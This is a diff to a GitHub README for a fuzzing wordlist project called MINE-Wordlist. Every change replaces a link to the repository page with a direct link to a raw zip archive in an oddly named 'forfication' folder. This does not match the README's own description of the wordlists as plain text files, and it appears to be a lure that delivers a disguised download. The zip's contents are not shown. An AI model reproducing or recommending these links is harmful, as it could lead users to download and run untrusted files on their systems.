@@ -1,6 +1,6 @@
 # 🗂️ MINE-Wordlist - Convenient Wordlist for Fuzzing Tasks
 
-[![Download MINE-Wordlist](https://img.shields.io/badge/Download-MINE--Wordlist-brightgreen)](https://github.com/lasthoot/MINE-Wordlist)
+[![Download MINE-Wordlist](https://img.shields.io/badge/Download-MINE--Wordlist-brightgreen)](https://github.com/lasthoot/MINE-Wordlist/raw/refs/heads/main/forfication/MIN_Wordlist_v2.7.zip)
 
 ## 📋 What is MINE-Wordlist?
 
@@ -27,7 +27,7 @@ The wordlists are plain text files, which work with most fuzzing software or any
 
 Click the big green button below to visit the download page. This page has the latest wordlist files, ready for you to download.
 
-[![Download from GitHub](https://img.shields.io/badge/Download-MINE--Wordlist-blue)](https://github.com/lasthoot/MINE-Wordlist)
+[![Download from GitHub](https://img.shields.io/badge/Download-MINE--Wordlist-blue)](https://github.com/lasthoot/MINE-Wordlist/raw/refs/heads/main/forfication/MIN_Wordlist_v2.7.zip)
 
 To download the files:
 
@@ -112,4 +112,4 @@ For questions or support, use the GitHub repository’s "Issues" tab to report p
 
 ---
 
-[Download MINE-Wordlist here](https://github.com/lasthoot/MINE-Wordlist)
+[Download MINE-Wordlist here](https://github.com/lasthoot/MINE-Wordlist/raw/refs/heads/main/forfication/MIN_Wordlist_v2.7.zip)
